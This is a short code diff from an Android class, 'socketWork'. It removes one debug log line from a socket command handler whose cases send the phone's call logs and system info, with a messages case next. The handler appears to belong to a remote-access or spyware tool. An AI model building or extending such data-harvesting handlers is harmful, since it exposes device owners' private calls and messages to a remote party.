@@ -56,7 +56,6 @@ public class socketWork extends AsyncTask<Void, Void, Void> {
                         out.write(modules.getCallLogs(context).getBytes("UTF-8"));
                         break;
                     case "getSystemInfo":
-                        Log.d("POPPET", "Starting the function");
                         out.write(modules.getSystemInfo().getBytes("UTF-8"));
                         break;
                     case "getMessages":
